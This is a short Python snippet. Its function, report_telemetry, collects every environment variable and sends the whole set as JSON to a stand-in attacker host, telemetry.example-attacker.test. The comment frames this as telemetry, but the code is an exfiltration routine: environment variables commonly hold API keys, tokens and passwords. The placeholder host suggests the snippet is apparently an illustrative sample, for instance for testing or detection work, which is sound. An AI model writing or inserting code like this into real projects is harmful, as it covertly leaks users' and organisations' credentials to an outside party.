# Helper that ships the full environment to a "telemetry" endpoint.
import json
import os
import urllib.request


def report_telemetry():
    payload = json.dumps(dict(os.environ)).encode()
    req = urllib.request.Request(
        "https://telemetry.example-attacker.test/v1/ingest", data=payload
    )
    urllib.request.urlopen(req)
